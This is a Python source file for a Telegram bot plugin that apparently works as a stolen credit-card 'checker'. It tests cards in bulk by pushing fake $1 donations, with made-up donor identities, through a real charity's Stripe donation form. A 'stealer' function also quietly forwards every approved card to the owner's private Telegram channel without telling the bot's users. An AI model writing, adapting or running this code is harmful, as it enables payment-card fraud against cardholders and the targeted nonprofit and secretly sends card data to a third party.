import time
import asyncio
import re
import os
import random
import requests
from html import unescape
from user_agent import generate_user_agent
from faker import Faker
from pyrogram import Client, filters, enums
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from TOOLS.getcc_for_mass import *

# ========== CONFIGURATION ==========
GATE_NAME = "PayPal 1$ charge"
MAX_MSC_LIMIT = 10
MAX_TSC_LIMIT = 100

OWNER_DM = "https://t.me/spid_3r"
SYMBOL = f"<a href='{OWNER_DM}'>㊕</a>"
STEALER_CHANNEL_ID = -1003627495953

fake = Faker()

# ========== SYNC CHECKER (UPDATED – no generic "Donation successful") ==========
def unitedway_check_sync(card_line):
    try:
        parts = card_line.strip().split('|')
        if len(parts) != 4:
            return "Error", "Invalid format (CC|MM|YY|CVV)"
        card_num, exp_month, exp_year, cvv = parts
        if len(exp_year) == 4:
            exp_year = exp_year[-2:]
        u = generate_user_agent()
        r = requests.Session()
        email = fake.email()
        name = fake.name()
        
        # Step 1: Get form hash
        headers = {'user-agent': u}
        params = {'form-id': '101', 'payment-mode': 'stripe', 'level-id': 'custom', 'custom-amount': '1'}
        html = r.get('https://www.unitedwaykitsap.org/Donate/', params=params, headers=headers).text
        hash_match = re.search(r'name="give-form-hash" value="([^"]+)"', html)
        if not hash_match:
            return "Error", "Failed to extract form hash"
        form_hash = hash_match.group(1)
        
        # Step 2: Initial AJAX
        headers_ajax = {
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.unitedwaykitsap.org',
            'referer': 'https://www.unitedwaykitsap.org/Donate/',
            'user-agent': u,
            'x-requested-with': 'XMLHttpRequest',
        }
        data_ajax = {
            'give-honeypot': '', 'give-form-id-prefix': '101-1', 'give-form-id': '101',
            'give-form-title': 'Make a gift today', 'give-current-url': 'https://www.unitedwaykitsap.org/Donate/',
            'give-form-url': 'https://www.unitedwaykitsap.org/Donate/', 'give-form-minimum': '1',
            'give-form-maximum': '1000000', 'give-form-hash': form_hash, 'give-price-id': 'custom',
            'give-recurring-logged-in-only': '', 'give-logged-in-only': '1', '_give_is_donation_recurring': '0',
            'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}', 'give-amount': '1',
            'give-recurring-period-donors-choice': 'month', 'address': 'New york 50 park',
            'give_stripe_payment_method': '', 'payment-mode': 'stripe', 'give_title': 'Mr.',
            'give_first': name, 'give_last': name, 'give_company_name': name, 'give_email': email,
            'card_name': name, 'give_action': 'purchase', 'give-gateway': 'stripe',
            'action': 'give_process_donation', 'give_ajax': 'true',
        }
        r.post('https://www.unitedwaykitsap.org/wp-admin/admin-ajax.php', headers=headers_ajax, data=data_ajax)
        
        # Step 3: Create Stripe payment method
        pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', html)
        pk = pk_match.group(0) if pk_match else 'pk_live_tL7CLPLhwWj0ufyKvozklYDB'
        stripe_data = f'type=card&billing_details[name]={name}+{name}&billing_details[email]={email}&card[number]={card_num}&card[cvc]={cvv}&card[exp_month]={exp_month}&card[exp_year]={exp_year}&payment_user_agent=stripe.js%2F1e42d46cc8%3B+stripe-js-v3%2F1e42d46cc8%3B+split-card-element&key={pk}'
        stripe_resp = r.post('https://api.stripe.com/v1/payment_methods', headers={'user-agent': u}, data=stripe_data)
        pm_data = stripe_resp.json()
        if 'error' in pm_data:
            return "Declined ❌", pm_data['error'].get('message', 'Stripe error')
        pm_id = pm_data.get('id')
        if not pm_id:
            return "Error", "Failed to create payment method"
        
        # Step 4: Submit donation
        headers_submit = {
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.unitedwaykitsap.org',
            'referer': 'https://www.unitedwaykitsap.org/Donate/?form-id=101&payment-mode=stripe&level-id=custom&custom-amount=1',
            'user-agent': u,
        }
        params_submit = {'payment-mode': 'stripe', 'form-id': '101'}
        data_submit = {
            'give-honeypot': '', 'give-form-id-prefix': '101-1', 'give-form-id': '101',
            'give-form-title': 'Make a gift today', 'give-current-url': 'https://www.unitedwaykitsap.org/Donate/',
            'give-form-url': 'https://www.unitedwaykitsap.org/Donate/', 'give-form-minimum': '1',
            'give-form-maximum': '1000000', 'give-form-hash': form_hash, 'give-price-id': 'custom',
            'give-recurring-logged-in-only': '', 'give-logged-in-only': '1', '_give_is_donation_recurring': '0',
            'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}', 'give-amount': '1',
            'give-recurring-period-donors-choice': 'month', 'address': 'New york 50 park',
            'give_stripe_payment_method': pm_id, 'payment-mode': 'stripe', 'give_title': 'Mr.',
            'give_first': name, 'give_last': name, 'give_company_name': name, 'give_email': email,
            'card_name': name, 'give_action': 'purchase', 'give-gateway': 'stripe',
        }
        submit_resp = r.post('https://www.unitedwaykitsap.org/Donate/', params=params_submit, headers=headers_submit, data=data_submit)
        response_text = submit_resp.text
        
        # Extract error message from donation response
        error_div = re.search(r'<div[^>]*class="[^"]*give_notices[^"]*"[^>]*>(.*?)</div>\s*</div>', response_text, re.DOTALL)
        if error_div:
            error_msg = re.sub(r'<[^>]+>', '', error_div.group(0))
            error_msg = unescape(error_msg).strip()
            return "Declined ❌", error_msg
        else:
            # Check for success indicator (no error div means likely success)
            if 'thank you' in response_text.lower() or 'receipt' in response_text.lower():
                return "Approved ✅", "Transaction approved"
            # Fallback: try to find any error text
            error_match = re.search(r'Error:\s*([^<]+)', response_text)
            if error_match:
                return "Declined ❌", error_match.group(1).strip()
        
        # If all else fails, return a snippet of the response (so the user sees something real)
        snippet = response_text[:200].replace('\n', ' ')
        return "Unknown", snippet
        
    except Exception as e:
        return "Error", str(e)[:50]

# ========== ASYNC WRAPPER ==========
async def unitedway_check_async(fullcc):
    loop = asyncio.get_running_loop()
    return await loop.run_in_executor(None, unitedway_check_sync, fullcc)

def extract_cards(text):
    return re.findall(r"\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}", text)

# ========== STEALER FUNCTION ==========
async def send_hit_to_stealer(client, fullcc, status, response, gateway, time_taken, first_name, role):
    try:
        stealer_msg = f"""✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗛𝗜𝗧 ✅

{SYMBOL} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {gateway}
{SYMBOL} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response}

{SYMBOL} 𝗧𝗼𝗼ᴋ {time_taken:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=stealer_msg, parse_mode="HTML")
    except Exception as e:
        print(f"[Stealer Error] {e}")

# ========== SINGLE CHECK /pp ==========
@Client.on_message(filters.command("pp", [".", "/"]))
async def unitedway_single(client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(client, message)
        if not checkall[0]:
            return
        role = checkall[1]
        getcc = await getmessage(message)
        if not getcc:
            await message.reply_text(
                f"✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦\n"
                f"⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}\n"
                f"↪ <b>ᴜꜱᴀɢᴇ :</b> /pp cc|mm|yy|cvv",
                quote=True, parse_mode=enums.ParseMode.HTML
            )
            return
        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"

        # Animation
        msg = await message.reply_text(
            f"✧ ᴄʜᴇᴄᴋɪɴɢ. ✧\n\n{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>\n{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{GATE_NAME}</i>\n{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■□□□",
            quote=True, parse_mode=enums.ParseMode.HTML
        )
        await asyncio.sleep(0.5)
        await client.edit_message_text(message.chat.id, msg.id,
            f"✧ ᴄʜᴇᴄᴋɪɴɢ.. ✧\n\n{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>\n{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{GATE_NAME}</i>\n{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■□",
            parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)
        start = time.perf_counter()
        status, api_message = await unitedway_check_async(fullcc)
        elapsed = time.perf_counter() - start
        await client.edit_message_text(message.chat.id, msg.id,
            f"✧ ᴄʜᴇᴄᴋɪɴɢ... ✧\n\n{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>\n{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{GATE_NAME}</i>\n{SYMBOL} 𝙍𝙚𝙨𝙥𝙤ɴꜱᴇ -» ■■■■",
            parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

        getbin = await get_bin_details(cc)
        brand = getbin[0] if len(getbin) > 0 else "Unknown"
        type_ = getbin[1] if len(getbin) > 1 else "Unknown"
        level = getbin[2] if len(getbin) > 2 else "Unknown"
        bank = getbin[3] if len(getbin) > 3 else "Unknown"
        country = getbin[4] if len(getbin) > 4 else "Unknown"
        flag = getbin[5] if len(getbin) > 5 else ""

        if "Approved" in status:
            await send_hit_to_stealer(client, fullcc, status, api_message, GATE_NAME, elapsed, first_name, role)

        final_text = f"""<b>{status}</b>

{SYMBOL} 𝗖𝗖 ⇾ <code>{fullcc}</code>
{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {GATE_NAME}
{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {api_message[:200]}{'...' if len(api_message) > 200 else ''}

{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {brand}_{type_}-{level}
{SYMBOL} 𝗕ᴀɴᴋ: {bank}
{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {country} {flag}

{SYMBOL} 𝗧ᴏᴏᴋ {elapsed:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""

        await client.edit_message_text(message.chat.id, msg.id, final_text, disable_web_page_preview=True, parse_mode=enums.ParseMode.HTML)
        await setantispamtime(user_id)
        await deductcredit(user_id)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# ========== MASS CHECK /mpp ==========
@Client.on_message(filters.command("mpp", [".", "/"]))
async def unitedway_mass(client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(client, message)
        if not checkall[0]:
            return
        role = checkall[1]
        getcc = await getcc_for_mass(message, role)
        if not getcc[0]:
            await message.reply_text(getcc[1], message.id, parse_mode=enums.ParseMode.HTML)
            return
        ccs = getcc[1]
        if len(ccs) > MAX_MSC_LIMIT:
            await message.reply_text(f"✦ ᴍᴀx {MAX_MSC_LIMIT} ᴄᴄ ᴀʟʟᴏᴡᴇᴅ. ʏᴏᴜ ᴘʀᴏᴠɪᴅᴇᴅ {len(ccs)} ✦", message.id, parse_mode=enums.ParseMode.HTML)
            ccs = ccs[:MAX_MSC_LIMIT]
        await process_sequential(client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# ========== TXT FILE CHECK /tpp ==========
@Client.on_message(filters.command("tpp", [".", "/"]))
async def unitedway_txt(client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(client, message)
        if not checkall[0]:
            return
        role = checkall[1]
        target = None
        if message.reply_to_message and message.reply_to_message.document:
            target = message.reply_to_message
        elif message.document:
            target = message
        if not target or not target.document.file_name.endswith(".txt"):
            await message.reply_text(
                f"✦ <b>ɴᴏ ꜰɪʟᴇ ꜰᴏᴜɴᴅ</b> ✦\n"
                f"⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}\n"
                f"↪ <b>ᴜꜱᴀɢᴇ :</b> Reply to a .txt file (max {MAX_TSC_LIMIT} cards)",
                quote=True, parse_mode=enums.ParseMode.HTML
            )
            return
        file_path = await client.download_media(target)
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
            ccs = extract_cards(content)
        os.remove(file_path)
        if not ccs:
            await message.reply("✦ ɴᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅꜱ ꜰᴏᴜɴᴅ ɪɴ ꜰɪʟᴇ ✗ ✦", quote=True, parse_mode=enums.ParseMode.HTML)
            return
        if len(ccs) > MAX_TSC_LIMIT:
            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_TSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True, parse_mode=enums.ParseMode.HTML)
            ccs = ccs[:MAX_TSC_LIMIT]
        await process_sequential(client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# ========== SEQUENTIAL PROCESSING ==========
async def process_sequential(client, message, ccs, user_id, first_name, role):
    total = len(ccs)
    approved = 0
    declined = 0
    start_time = time.perf_counter()
    approved_cards = []
    prog_msg = await message.reply(
        f"UnitedWay Stripe Checker\n\n{SYMBOL} Progress: 0/{total}\nApproved ✅: 0\nDeclined ❌: 0\nRemaining: {total}\n\nChecked by: {first_name} ({role})",
        quote=True, parse_mode=enums.ParseMode.HTML
    )
    for idx, fullcc in enumerate(ccs, 1):
        status, api_message = await unitedway_check_async(fullcc)
        cc_num = fullcc.split('|')[0]
        bin_data = await get_bin_details(cc_num)
        brand = bin_data[0] if len(bin_data) > 0 else "Unknown"
        type_ = bin_data[1] if len(bin_data) > 1 else "Unknown"
        level = bin_data[2] if len(bin_data) > 2 else "Unknown"
        bank = bin_data[3] if len(bin_data) > 3 else "Unknown"
        country = bin_data[4] if len(bin_data) > 4 else "Unknown"
        flag = bin_data[5] if len(bin_data) > 5 else ""
        if "Approved" in status:
            approved += 1
            card_time = time.perf_counter() - start_time
            approved_cards.append({
                "fullcc": fullcc, "status": status, "response": api_message,
                "brand": f"{brand}_{type_}-{level}", "bank": bank, "country": country, "flag": flag, "time": card_time
            })
            await send_hit_to_stealer(client, fullcc, status, api_message, GATE_NAME, card_time, first_name, role)
        else:
            declined += 1
        remaining = total - idx
        await prog_msg.edit_text(
            f"UnitedWay Stripe Checker\n\n{SYMBOL} Progress: {idx}/{total}\nApproved ✅: {approved}\nDeclined ❌: {declined}\nRemaining: {remaining}\n\nChecked by: {first_name} ({role})",
            parse_mode=enums.ParseMode.HTML
        )
        await asyncio.sleep(0.5)
    await prog_msg.delete()
    for card in approved_cards:
        await message.reply_text(
            f"<b>{card['status']}</b>\n\n{SYMBOL} 𝗖𝗖 ⇾ <code>{card['fullcc']}</code>\n{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {GATE_NAME}\n{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {card['response'][:200]}{'...' if len(card['response']) > 200 else ''}\n\n{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {card['brand']}\n{SYMBOL} 𝗕ᴀɴᴋ: {card['bank']}\n{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {card['country']} {card['flag']}\n\n{SYMBOL} 𝗧ᴏᴏᴋ {card['time']:.2f} 𝘀ᴇᴄᴏɴᴅs\n{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})",
            quote=True, parse_mode=enums.ParseMode.HTML
        )
        await asyncio.sleep(0.5)
    elapsed = round(time.perf_counter() - start_time, 2)
    if approved > 0:
        declined_list = [cc for cc in ccs if cc not in [c['fullcc'] for c in approved_cards]]
        decl_text = f"❌ 𝗗𝗲𝗰𝗹ɪɴᴇᴅ 𝗖ᴀʀᴅ𝘀 ({declined})\n\n━━━━━━━━━━━━━━━━━━━━\n"
        for card in declined_list[:15]:
            decl_text += f"{SYMBOL} {card} → Declined\n"
        if declined > 15:
            decl_text += f"\n... and {declined - 15} more declined cards"
        decl_text += f"\n━━━━━━━━━━━━━━━━━━━━\n✅ Approved: {approved}\n❌ Declined: {declined}\n📊 Total: {total}\n⏱ Time: {elapsed}s\n👤 Checked by: {first_name} ({role})"
        await message.reply_text(decl_text, quote=True, parse_mode=enums.ParseMode.HTML)
    else:
        await message.reply_text(
            f"❌ 𝗡ᴏ 𝗔ᴘᴘʀᴏᴠᴇᴅ 𝗖ᴀʀᴅ𝘀\n\n━━━━━━━━━━━━━━━━━━━━\n📊 Total Cards: {total}\n❌ All Declined: {declined}\n⏱ Time: {elapsed}s\n👤 Checked by: {first_name} ({role})",
            quote=True, parse_mode=enums.ParseMode.HTML
        )
    await setantispamtime(user_id)
    await massdeductcredit(user_id, total)
